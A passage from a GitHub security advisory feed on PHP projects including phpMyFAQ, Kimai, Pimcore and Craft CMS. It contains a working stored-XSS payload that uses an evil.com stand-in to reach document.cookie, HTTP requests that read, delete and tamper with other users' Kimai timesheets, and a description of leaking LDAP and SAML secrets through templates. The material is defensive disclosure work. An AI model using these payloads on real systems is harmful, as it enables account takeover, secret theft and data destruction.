<p>This only reaches the sink when <code>main.enableCommentEditor</code> is enabled. In that path, comment text goes through <code>sanitizeHtmlComment()</code> instead of <code>FILTER_SANITIZE_SPECIAL_CHARS</code> — which encodes <code>"</code> — so the double-quote survives to storage. The comment is then passed through parseUrl() and rendered via <code>{{ comment.comment|raw }}</code> in <code>comment.macros.twig</code> (line 40), which disables Twig auto-escaping.</p>
<p>The same sink exists in the admin comment panel (<code>admin/content/comments.twig</code>, lines 62 and 112), so admins viewing the panel are also affected.</p>
<p>No Content-Security-Policy headers are set anywhere in the app.</p>
<h3 id="poc">PoC</h3>
<p>Requirements:</p>
<ul>
<li>main.enableCommentEditor = true (set in admin Configuration panel)</li>
<li>attacker has any registered user account</li>
<li>one FAQ entry with comments allowed exists</li>
</ul>
<p>Steps:</p>
<ol>
<li><p>Log in as a registered user and open a FAQ with comments.</p>
</li>
<li><p>Submit the following as the comment text:</p>
<pre><code>https://www.evil.com/"onmouseover="alert(document.cookie)
</code></pre>
<p>(www. prefix required — parseUrl strips https:// then only re-adds
it for www. URLs, which is what triggers the linkification)</p>
</li>
<li><p>Any user who views that FAQ page and hovers the link triggers the
payload. To hit an admin, wait for them to visit the page or check
the admin comments panel at /admin/content/comments.</p>
</li>
</ol>
<p>Resulting HTML in the page:</p>
<pre><code>&lt;a href="https://www.evil.com/"onmouseover="alert(document.cookie)"&gt;
  ...
&lt;/a&gt;
</code></pre>
<p>The <code>"</code> closes the href attribute; onmouseover becomes a real attribute.</p>
<h3 id="impact">Impact</h3>
<p>Stored XSS affecting all visitors of the page, including admins. Session cookie theft leads to full admin account takeover. The payload looks like a normal URL and persists until manually deleted.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-9525-27vj-c8r8">https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-9525-27vj-c8r8</a></li>
<li><a href="https://github.com/advisories/GHSA-9525-27vj-c8r8">https://github.com/advisories/GHSA-9525-27vj-c8r8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9525-27vj-c8r8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-06T20:10:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[dedoc/scramble] Scramble vulnerable to remote code execution via evaluation of user-controlled input in validation rules]]></title>
        <id>https://github.com/advisories/GHSA-4rm2-28vj-fj39</id>
        <link href="https://github.com/advisories/GHSA-4rm2-28vj-fj39"/>
        <updated>2026-05-06T19:54:57.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A remote code execution (RCE) vulnerability affects versions <code>0.13.2</code> through <code>0.13.21</code>. When documentation endpoints are publicly accessible and validation rules reference user-controlled input, request supplied data may be evaluated during documentation generation, leading to execution of arbitrary PHP code in the application context.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in version <code>0.13.22</code>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If upgrading is not immediately possible:</p>
<ul>
<li>Restrict access to documentation endpoints (<code>/docs/api</code>, <code>/docs/api.json</code>)</li>
<li>Avoid using user-controlled variables inside validation rule expressions (e.g., values derived from request input)</li>
<li>Disable documentation endpoints in production environments if not required</li>
</ul>
<p>These measures significantly reduce or prevent exploitability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/dedoc/scramble/security/advisories/GHSA-4rm2-28vj-fj39">https://github.com/dedoc/scramble/security/advisories/GHSA-4rm2-28vj-fj39</a></li>
<li><a href="https://github.com/dedoc/scramble/releases/tag/v0.13.22">https://github.com/dedoc/scramble/releases/tag/v0.13.22</a></li>
<li><a href="https://github.com/advisories/GHSA-4rm2-28vj-fj39">https://github.com/advisories/GHSA-4rm2-28vj-fj39</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4rm2-28vj-fj39</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-05-06T19:54:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[kimai/kimai] Kimai's Twig function config() leaks server-wide secrets (LDAP bind password, SAML SP private key) via invoice/export templates]]></title>
        <id>https://github.com/advisories/GHSA-vrqv-52x7-rm4v</id>
        <link href="https://github.com/advisories/GHSA-vrqv-52x7-rm4v"/>
        <updated>2026-05-06T18:42:31.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Kimai's Twig sandbox (<code>StrictPolicy</code>, used for admin-uploaded invoice and export templates) allow-lists the <code>config()</code> Twig function with no key filtering. <code>config(name)</code> delegates to <code>App\Configuration\SystemConfiguration::find($name)</code>, which returns arbitrary entries from the flattened <code>kimai.config</code> container parameter built in <code>App\DependencyInjection\AppExtension::loadInternal()</code>. Any admin who can upload a Twig template can therefore render server-wide secrets - the LDAP bind password, the SAML SP private key, and any other dotted configuration key populated from <code>kimai.yaml</code> - into the invoice or export output, which is then delivered to whoever generates an invoice or export from that template (including lower-privileged users such as teamleads with invoice permissions). This is a second, uncovered class of the same defense-in-depth issue patched in GHSA-rh42-6rj2-xwmc: the previous fix added a User-method blocklist but left the <code>config()</code> function unrestricted.</p>
<h3 id="details">Details</h3>
<p><code>src/Twig/SecurityPolicy/StrictPolicy.php:40-55</code> explicitly allow-lists <code>'config'</code>:</p>
<pre><code class="language-php">private array $allowedFunctions = [
    'max', 'min', 'range', 'constant', 'cycle', 'random', 'date',
    't',
    'encore_entry_css_source', 'encore_entry_link_tags', 'encore_entry_script_tags',
    'is_granted',
    'qr_code_data_uri',
    'config',                       // &lt;-- sink, no key filter
    'create_date', 'month_names', 'locale_format',
    'class_name'
];
</code></pre>
<p><code>src/Twig/Configuration.php:22-45</code> is the Twig function implementation:</p>
<pre><code class="language-php">public function getFunctions(): array
{
    return [new TwigFunction('config', [$this, 'get'])];
}

public function get(string $name)
{
    switch ($name) {
        case 'chart-class':                     return '';
        case 'theme.chart.background_color':    return '#3c8dbc';
        // ... 4 more theme constants
    }
    return $this-&gt;configuration-&gt;find($name);   // &lt;-- arbitrary key lookup
}
</code></pre>
<p><code>App\Configuration\SystemConfiguration::find()</code> at <code>src/Configuration/SystemConfiguration.php:54-62</code> is a direct dictionary lookup. The dictionary <code>$this-&gt;settings</code> is initialised from the <code>kimai.config</code> container parameter, which the <code>AppExtension</code> flattens from <code>kimai.yaml</code> into dotted-notation keys.</p>
<pre><code>
The LDAP and SAML schemas declared in `src/DependencyInjection/Configuration.php` define secret-valued scalar nodes that survive the flattening and become reachable keys:

```php
// getLdapNode()
-&gt;arrayNode('connection')
    -&gt;children()
        -&gt;scalarNode('host')-&gt;defaultNull()-&gt;end()
        -&gt;scalarNode('username')-&gt;end()
        -&gt;scalarNode('password')-&gt;end()       // -&gt; settings['ldap.connection.password']
        ...

// getSamlNode()
-&gt;arrayNode('sp')
    -&gt;children()
        -&gt;scalarNode('x509cert')-&gt;end()
        -&gt;scalarNode('privateKey')-&gt;end()     // -&gt; settings['saml.connection.sp.privateKey']
        ...
</code></pre>
<p>The invoice and export renderers both enable the sandbox against <code>StrictPolicy</code> and pass the shared Twig environment - the one with the <code>config</code> function registered - into sandboxed rendering: <code>src/Invoice/Renderer/AbstractTwigRenderer.php:66-74</code> and <code>src/Export/Base/{PDFRenderer,HtmlRenderer}.php</code>. An admin who uploads a malicious invoice or export template therefore gets an unrestricted read primitive against <code>kimai.config</code>.</p>
<p>In a real deployment the attacker template is uploaded through the admin UI (ROLE_SUPER_ADMIN, permission <code>upload_invoice_template</code>), saved by <code>src/Invoice/InvoiceTemplate*</code> and later rendered by whoever generates an invoice or export for that template. The rendering user is typically a teamlead or admin with invoice permission (<code>INVOICE</code> permission set: <code>['view_invoice','create_invoice','manage_invoice_template']</code>, granted to ROLE_ADMIN and ROLE_TEAMLEAD in <code>config/packages/kimai.yaml</code>). The rendered output is returned as the invoice PDF/HTML or as a CSV/XLSX export, so the secrets land in a document that is routinely downloaded and emailed.</p>
<h3 id="impact">Impact</h3>
<p>Any Kimai deployment that (a) has SAML or LDAP configured in <code>kimai.yaml</code>, and (b) has at least one user (other than the current SUPER_ADMIN) who will render a template-based invoice or export in the future, is affected. A malicious or compromised SUPER_ADMIN can upload a template once, leave, and subsequent invoice or export generations by teamleads or other admins silently exfiltrate <code>ldap.connection.password</code>, <code>saml.connection.sp.privateKey</code>, <code>saml.connection.sp.x509cert</code>, and any other dotted configuration key into an attacker-readable artifact. The LDAP bind password gives domain-credential access to the company directory and often to every downstream system that trusts the same directory; the SAML SP private key allows an attacker to forge signed SAML assertions to any service provider that trusts the same key pair. This is the same class of defense-in-depth leak that GHSA-rh42-6rj2-xwmc patched for user-level secrets, at a broader impact because the keys leaked here are system-wide rather than per-user, and the current StrictPolicy does not intercept the <code>config()</code> call path. </p>
<h3 id="solution">Solution</h3>
<p>The <code>config()</code> function was patched to only return a pre-configured list of settings in sandboxed mode. </p>
<p>Additional checks were added to prevent access to configs that start with <code>saml.</code> or <code>ldap.</code>.</p>
<p>Kimai will not issue a CVE, because this requires a SUPER_ADMIN account and it only affects system with activated LDAP or SAML, which also uses the invoice system.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/kimai/kimai/security/advisories/GHSA-vrqv-52x7-rm4v">https://github.com/kimai/kimai/security/advisories/GHSA-vrqv-52x7-rm4v</a></li>
<li><a href="https://github.com/advisories/GHSA-vrqv-52x7-rm4v">https://github.com/advisories/GHSA-vrqv-52x7-rm4v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vrqv-52x7-rm4v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-06T18:42:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pimcore/pimcore] Pimcore has an authenticated Cross-site Scripting issue]]></title>
        <id>https://github.com/advisories/GHSA-7gxw-q9j5-mrj4</id>
        <link href="https://github.com/advisories/GHSA-7gxw-q9j5-mrj4"/>
        <updated>2026-05-06T18:40:18.000Z</updated>
        <content type="html"><![CDATA[<p>An authenticated attacker with permission to edit document content can store crafted HTML/JavaScript in a Document embed editable and cause script execution when the published page is rendered.</p>
<p>This issue affects pimcore: v12.3.3.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-5362">https://nvd.nist.gov/vuln/detail/CVE-2026-5362</a></li>
<li><a href="https://fluidattacks.com/es/advisories/mago">https://fluidattacks.com/es/advisories/mago</a></li>
<li><a href="https://github.com/pimcore/pimcore">https://github.com/pimcore/pimcore</a></li>
<li><a href="https://github.com/advisories/GHSA-7gxw-q9j5-mrj4">https://github.com/advisories/GHSA-7gxw-q9j5-mrj4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7gxw-q9j5-mrj4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-27T21:31:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pimcore/pimcore] Pimcore admin users can trigger SQL Injection]]></title>
        <id>https://github.com/advisories/GHSA-c8g3-x47w-8q7p</id>
        <link href="https://github.com/advisories/GHSA-c8g3-x47w-8q7p"/>
        <updated>2026-05-06T18:32:17.000Z</updated>
        <content type="html"><![CDATA[<p>An authenticated administrative user who can import or save DataObject class definitions can inject attacker-controlled composite index metadata and trigger unintended SQL execution in the backend.</p>
<p>This issue affects pimcore: 12.3.3.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-5394">https://nvd.nist.gov/vuln/detail/CVE-2026-5394</a></li>
<li><a href="https://fluidattacks.com/es/advisories/dragons">https://fluidattacks.com/es/advisories/dragons</a></li>
<li><a href="https://github.com/pimcore/pimcore">https://github.com/pimcore/pimcore</a></li>
<li><a href="https://github.com/pimcore/pimcore/pull/19108">https://github.com/pimcore/pimcore/pull/19108</a></li>
<li><a href="https://github.com/advisories/GHSA-c8g3-x47w-8q7p">https://github.com/advisories/GHSA-c8g3-x47w-8q7p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c8g3-x47w-8q7p</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-27T21:31:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[kimai/kimai] Kimai has Missing Voter Check that Allows Cross-Team Timesheet Manipulation]]></title>
        <id>https://github.com/advisories/GHSA-9g2q-w3w2-vf7q</id>
        <link href="https://github.com/advisories/GHSA-9g2q-w3w2-vf7q"/>
        <updated>2026-05-06T18:28:46.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Any ROLE_TEAMLEAD user can enumerate, read, modify, and permanently delete timesheets belonging to any other user in the system — regardless of team membership. This enables data destruction (deleted billable hours), data tampering (forged timesheet durations), and full authorization bypass on timesheet resources. Verified against Kimai 2.52.0.</p>
<h3 id="details">Details</h3>
<p><code>TimesheetVoter::voteOnAttribute()</code> maps permissions to <code>own_timesheet</code> or <code>other_timesheet</code> without checking team membership. The voter's own comment confirms this is a known gap:</p>
<pre><code class="language-php">// extend me for "team" support later on
if ($subject-&gt;getUser()?-&gt;getId() === $user-&gt;getId()) {
    $permission .= 'own';
} else {
    $permission .= 'other';
}
</code></pre>
<h3 id="poc">PoC</h3>
<p>Tested against Kimai 2.52.0 Docker instance.</p>
<p>Setup:</p>
<ul>
<li>User A (usera, ROLE_TEAMLEAD) owns timesheet ID 2 with description "Private timesheet - UserA only"</li>
<li>User B (userb, ROLE_TEAMLEAD) is NOT on any team with User A</li>
</ul>
<p><strong>User B reads User A's timesheet data:</strong></p>
<pre><code>GET /api/timesheets/2 HTTP/1.1
X-AUTH-USER: userb
X-AUTH-TOKEN: &lt;userb_api_token&gt;
</code></pre>
<p>Response: HTTP 200 — returns full timesheet record including description "Private timesheet - UserA only".</p>
<p><strong>User B deletes User A's timesheet:</strong></p>
<pre><code>DELETE /api/timesheets/3 HTTP/1.1
X-AUTH-USER: userb
X-AUTH-TOKEN: &lt;userb_api_token&gt;
</code></pre>
<p>Response: HTTP 204 No Content — timesheet permanently deleted.</p>
<p><strong>User B tampers User A's timesheet:</strong></p>
<pre><code>PATCH /api/timesheets/6 HTTP/1.1
X-AUTH-USER: userb
X-AUTH-TOKEN: &lt;userb_api_token&gt;
Content-Type: application/json

{"begin":"2026-03-24T08:00:00","end":"2026-03-24T18:00:00","project":1,"activity":1,"description":"TAMPERED","exported":false,"billable":false}
</code></pre>
<p>Response: HTTP 200 OK — duration inflated from 3600s to 36000s, description overwritten.</p>
<p><strong>Note:</strong> ROLE_USER (userc) is correctly blocked — DELETE returns 403 and the actions endpoint returns an empty array. The vulnerability only affects ROLE_TEAMLEAD and above. Timesheet IDs are sequential integers, trivially enumerable.</p>
<h3 id="impact">Impact</h3>
<p>Any authenticated user with ROLE_TEAMLEAD or above can:</p>
<ol>
<li>Permanently delete timesheets belonging to any user system-wide — destroying billable hours, payroll data, and project billing history</li>
<li>Silently alter timesheet descriptions, hours, and billing flags — forging hours up or down, directly affecting invoicing and payroll</li>
<li>Enumerate all timesheet IDs (sequential integers) and access action metadata for arbitrary records</li>
</ol>
<p>No user interaction required. ROLE_USER accounts are correctly restricted; the vulnerability is specific to ROLE_TEAMLEAD receiving global scope instead of team-scoped access.</p>
<h3 id="maintainers-answer-why-this-is-not-eligible-for-a-cve">Maintainers answer: why this is not eligible for a CVE</h3>
<p>The behavior described matches the documented permission model. Per the Kimai documentation, the relevant permissions granted to <code>ROLE_TEAMLEAD</code> are:</p>
<ul>
<li><code>edit_other_timesheet</code> — Edit existing records of other users</li>
<li><code>delete_other_timesheet</code> — Delete existing records of other users</li>
</ul>
<p>These permissions were global by design, not team-scoped. The UI surfaces only the teamlead's own team timesheets, but the API has historically honored these permissions as documented: a role holding <code>*_other_timesheet</code> can act on any other user's timesheet. The inline comment <code>// extend me for "team" support later on</code> reflects this accurately — team-scoped enforcement was a planned enhancement, not a security control that existed and failed.</p>
<p>The report frames this as authorization bypass, but no authorization boundary is being crossed: <code>ROLE_TEAMLEAD</code> is operating within its documented permissions.</p>
<p>Kimai acknowledges that this behavior might not be expected, so while it will be treated as a feature request for team-scoped permission enforcement and not a vulnerability, it still track it as having security implications.</p>
<h3 id="solution">Solution</h3>
<p>Team-scoped timesheet permission checks were added in 2.56.0.</p>
<p>Operators of Kimai &lt;= 2.55 who need stricter isolation between teamleads should not grant <code>ROLE_TEAMLEAD</code> to users who must not act on other teams' timesheets.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/kimai/kimai/security/advisories/GHSA-9g2q-w3w2-vf7q">https://github.com/kimai/kimai/security/advisories/GHSA-9g2q-w3w2-vf7q</a></li>
<li><a href="https://github.com/advisories/GHSA-9g2q-w3w2-vf7q">https://github.com/advisories/GHSA-9g2q-w3w2-vf7q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9g2q-w3w2-vf7q</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-06T18:28:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpseclib/phpseclib] phpseclib: guardrails needed on isPrime and randomPrime]]></title>
        <id>https://github.com/advisories/GHSA-2528-jw5q-ww88</id>
        <link href="https://github.com/advisories/GHSA-2528-jw5q-ww88"/>
        <updated>2026-05-06T17:57:11.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Anyone trying to generate a prime and testing the primality of a number.</p>
<h3 id="patches">Patches</h3>
<p><a href="https://github.com/phpseclib/phpseclib/commit/ad5dbdf2129f5e0fb644637770b7f33de8ca8575">https://github.com/phpseclib/phpseclib/commit/ad5dbdf2129f5e0fb644637770b7f33de8ca8575</a></p>
<h3 id="workarounds">Workarounds</h3>
<p>Using the GMP extension would probably help, assuming that one has its own guardrails.</p>
<h3 id="resources">Resources</h3>
<p><a href="https://github.com/phpseclib/phpseclib/commit/ad5dbdf2129f5e0fb644637770b7f33de8ca8575">https://github.com/phpseclib/phpseclib/commit/ad5dbdf2129f5e0fb644637770b7f33de8ca8575</a>
<a href="https://www.usenix.org/system/files/conference/usenixsecurity25/sec25cycle1-prepub-599-shi-bing.pdf">https://www.usenix.org/system/files/conference/usenixsecurity25/sec25cycle1-prepub-599-shi-bing.pdf</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/phpseclib/phpseclib/security/advisories/GHSA-2528-jw5q-ww88">https://github.com/phpseclib/phpseclib/security/advisories/GHSA-2528-jw5q-ww88</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-27354">https://nvd.nist.gov/vuln/detail/CVE-2024-27354</a></li>
<li><a href="https://github.com/phpseclib/phpseclib/commit/2870c8fab3f132d2ed40a66c97a36fe5ab625698">https://github.com/phpseclib/phpseclib/commit/2870c8fab3f132d2ed40a66c97a36fe5ab625698</a></li>
<li><a href="https://github.com/phpseclib/phpseclib/commit/ad5dbdf2129f5e0fb644637770b7f33de8ca8575">https://github.com/phpseclib/phpseclib/commit/ad5dbdf2129f5e0fb644637770b7f33de8ca8575</a></li>
<li><a href="https://github.com/phpseclib/phpseclib/commit/c55b75199ec8d12cec6eadf6da99da4a3712fe56">https://github.com/phpseclib/phpseclib/commit/c55b75199ec8d12cec6eadf6da99da4a3712fe56</a></li>
<li><a href="https://gist.github.com/katzj/ee72f3c2a00590812b2ea3c0c8890e0b">https://gist.github.com/katzj/ee72f3c2a00590812b2ea3c0c8890e0b</a></li>
<li><a href="https://github.com/FriendsOfPHP/security-advisories/blob/master/phpseclib/phpseclib/CVE-2024-27354.yaml">https://github.com/FriendsOfPHP/security-advisories/blob/master/phpseclib/phpseclib/CVE-2024-27354.yaml</a></li>
<li><a href="https://github.com/phpseclib/phpseclib/blob/master/phpseclib/Math/PrimeField.php#L49">https://github.com/phpseclib/phpseclib/blob/master/phpseclib/Math/PrimeField.php#L49</a></li>
<li><a href="https://lists.debian.org/debian-lts-announce/2024/03/msg00002.html">https://lists.debian.org/debian-lts-announce/2024/03/msg00002.html</a></li>
<li><a href="https://lists.debian.org/debian-lts-announce/2024/03/msg00003.html">https://lists.debian.org/debian-lts-announce/2024/03/msg00003.html</a></li>
<li><a href="https://github.com/advisories/GHSA-2528-jw5q-ww88">https://github.com/advisories/GHSA-2528-jw5q-ww88</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2528-jw5q-ww88</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-06T17:57:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpseclib/phpseclib] phpseclib: guardrails needed on isPrime and randomPrime]]></title>
        <id>https://github.com/advisories/GHSA-2528-jw5q-ww88</id>
        <link href="https://github.com/advisories/GHSA-2528-jw5q-ww88"/>
        <updated>2026-05-06T17:57:11.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Anyone trying to generate a prime and testing the primality of a number.</p>
<h3 id="patches">Patches</h3>
<p><a href="https://github.com/phpseclib/phpseclib/commit/ad5dbdf2129f5e0fb644637770b7f33de8ca8575">https://github.com/phpseclib/phpseclib/commit/ad5dbdf2129f5e0fb644637770b7f33de8ca8575</a></p>
<h3 id="workarounds">Workarounds</h3>
<p>Using the GMP extension would probably help, assuming that one has its own guardrails.</p>
<h3 id="resources">Resources</h3>
<p><a href="https://github.com/phpseclib/phpseclib/commit/ad5dbdf2129f5e0fb644637770b7f33de8ca8575">https://github.com/phpseclib/phpseclib/commit/ad5dbdf2129f5e0fb644637770b7f33de8ca8575</a>
<a href="https://www.usenix.org/system/files/conference/usenixsecurity25/sec25cycle1-prepub-599-shi-bing.pdf">https://www.usenix.org/system/files/conference/usenixsecurity25/sec25cycle1-prepub-599-shi-bing.pdf</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/phpseclib/phpseclib/security/advisories/GHSA-2528-jw5q-ww88">https://github.com/phpseclib/phpseclib/security/advisories/GHSA-2528-jw5q-ww88</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-27354">https://nvd.nist.gov/vuln/detail/CVE-2024-27354</a></li>
<li><a href="https://github.com/phpseclib/phpseclib/commit/2870c8fab3f132d2ed40a66c97a36fe5ab625698">https://github.com/phpseclib/phpseclib/commit/2870c8fab3f132d2ed40a66c97a36fe5ab625698</a></li>
<li><a href="https://github.com/phpseclib/phpseclib/commit/ad5dbdf2129f5e0fb644637770b7f33de8ca8575">https://github.com/phpseclib/phpseclib/commit/ad5dbdf2129f5e0fb644637770b7f33de8ca8575</a></li>
<li><a href="https://github.com/phpseclib/phpseclib/commit/c55b75199ec8d12cec6eadf6da99da4a3712fe56">https://github.com/phpseclib/phpseclib/commit/c55b75199ec8d12cec6eadf6da99da4a3712fe56</a></li>
<li><a href="https://gist.github.com/katzj/ee72f3c2a00590812b2ea3c0c8890e0b">https://gist.github.com/katzj/ee72f3c2a00590812b2ea3c0c8890e0b</a></li>
<li><a href="https://github.com/FriendsOfPHP/security-advisories/blob/master/phpseclib/phpseclib/CVE-2024-27354.yaml">https://github.com/FriendsOfPHP/security-advisories/blob/master/phpseclib/phpseclib/CVE-2024-27354.yaml</a></li>
<li><a href="https://github.com/phpseclib/phpseclib/blob/master/phpseclib/Math/PrimeField.php#L49">https://github.com/phpseclib/phpseclib/blob/master/phpseclib/Math/PrimeField.php#L49</a></li>
<li><a href="https://lists.debian.org/debian-lts-announce/2024/03/msg00002.html">https://lists.debian.org/debian-lts-announce/2024/03/msg00002.html</a></li>
<li><a href="https://lists.debian.org/debian-lts-announce/2024/03/msg00003.html">https://lists.debian.org/debian-lts-announce/2024/03/msg00003.html</a></li>
<li><a href="https://github.com/advisories/GHSA-2528-jw5q-ww88">https://github.com/advisories/GHSA-2528-jw5q-ww88</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2528-jw5q-ww88</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-06T17:57:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpseclib/phpseclib] phpseclib: guardrails needed on isPrime and randomPrime]]></title>
        <id>https://github.com/advisories/GHSA-2528-jw5q-ww88</id>
        <link href="https://github.com/advisories/GHSA-2528-jw5q-ww88"/>
        <updated>2026-05-06T17:57:11.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Anyone trying to generate a prime and testing the primality of a number.</p>
<h3 id="patches">Patches</h3>
<p><a href="https://github.com/phpseclib/phpseclib/commit/ad5dbdf2129f5e0fb644637770b7f33de8ca8575">https://github.com/phpseclib/phpseclib/commit/ad5dbdf2129f5e0fb644637770b7f33de8ca8575</a></p>
<h3 id="workarounds">Workarounds</h3>
<p>Using the GMP extension would probably help, assuming that one has its own guardrails.</p>
<h3 id="resources">Resources</h3>
<p><a href="https://github.com/phpseclib/phpseclib/commit/ad5dbdf2129f5e0fb644637770b7f33de8ca8575">https://github.com/phpseclib/phpseclib/commit/ad5dbdf2129f5e0fb644637770b7f33de8ca8575</a>
<a href="https://www.usenix.org/system/files/conference/usenixsecurity25/sec25cycle1-prepub-599-shi-bing.pdf">https://www.usenix.org/system/files/conference/usenixsecurity25/sec25cycle1-prepub-599-shi-bing.pdf</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/phpseclib/phpseclib/security/advisories/GHSA-2528-jw5q-ww88">https://github.com/phpseclib/phpseclib/security/advisories/GHSA-2528-jw5q-ww88</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-27354">https://nvd.nist.gov/vuln/detail/CVE-2024-27354</a></li>
<li><a href="https://github.com/phpseclib/phpseclib/commit/2870c8fab3f132d2ed40a66c97a36fe5ab625698">https://github.com/phpseclib/phpseclib/commit/2870c8fab3f132d2ed40a66c97a36fe5ab625698</a></li>
<li><a href="https://github.com/phpseclib/phpseclib/commit/ad5dbdf2129f5e0fb644637770b7f33de8ca8575">https://github.com/phpseclib/phpseclib/commit/ad5dbdf2129f5e0fb644637770b7f33de8ca8575</a></li>
<li><a href="https://github.com/phpseclib/phpseclib/commit/c55b75199ec8d12cec6eadf6da99da4a3712fe56">https://github.com/phpseclib/phpseclib/commit/c55b75199ec8d12cec6eadf6da99da4a3712fe56</a></li>
<li><a href="https://gist.github.com/katzj/ee72f3c2a00590812b2ea3c0c8890e0b">https://gist.github.com/katzj/ee72f3c2a00590812b2ea3c0c8890e0b</a></li>
<li><a href="https://github.com/FriendsOfPHP/security-advisories/blob/master/phpseclib/phpseclib/CVE-2024-27354.yaml">https://github.com/FriendsOfPHP/security-advisories/blob/master/phpseclib/phpseclib/CVE-2024-27354.yaml</a></li>
<li><a href="https://github.com/phpseclib/phpseclib/blob/master/phpseclib/Math/PrimeField.php#L49">https://github.com/phpseclib/phpseclib/blob/master/phpseclib/Math/PrimeField.php#L49</a></li>
<li><a href="https://lists.debian.org/debian-lts-announce/2024/03/msg00002.html">https://lists.debian.org/debian-lts-announce/2024/03/msg00002.html</a></li>
<li><a href="https://lists.debian.org/debian-lts-announce/2024/03/msg00003.html">https://lists.debian.org/debian-lts-announce/2024/03/msg00003.html</a></li>
<li><a href="https://github.com/advisories/GHSA-2528-jw5q-ww88">https://github.com/advisories/GHSA-2528-jw5q-ww88</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2528-jw5q-ww88</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-06T17:57:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[craftcms/cms] Craft CMS's Missing Volume Permission Check in AssetsController::actionShowInFolder Allows Information Disclosure]]></title>
        <id>https://github.com/advisories/GHSA-33m5-hqp9-97pw</id>
        <link href="https://github.com/advisories/GHSA-33m5-hqp9-97pw"/>
        <updated>2026-05-06T17:54:48.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>AssetsController::actionShowInFolder()</code> fetches an asset by ID and returns its filename and complete folder hierarchy (including volume handle, volume UID, folder names, folder UIDs, and folder URI paths) without checking whether the requesting user has <code>viewAssets</code> or <code>viewPeerAssets</code> permission on the asset’s volume. Any authenticated CP user — even one with zero volume permissions — can enumerate asset filenames and the full folder structure of any volume by supplying arbitrary asset IDs.</p>
<p>This follows the exact same incomplete-patch pattern as four GHSAs merged on 2026-02-25 (GHSA-x76w-8c62-48mg, GHSA-vgjg-248p-rfm2, GHSA-5pgf-h923-m958, GHSA-3pvf-vxrv-hh9c), all of which added <code>requireVolumePermissionByAsset()</code> + <code>requirePeerVolumePermissionByAsset()</code> to sibling AssetsController actions. The <code>actionShowInFolder</code> method was introduced thirteen days before the patch wave and was not included in it.</p>
<h2 id="details">Details</h2>
<p>The vulnerability is in <code>src/controllers/AssetsController.php</code> at line 1437. The method:</p>
<ol>
<li>Calls <code>requireCpRequest()</code> — verifies the request targets the CP, enforces <code>accessCp</code> permission via <code>Controller::_enforceAllowAnonymous()</code>, but does NOT enforce any volume-level permission.</li>
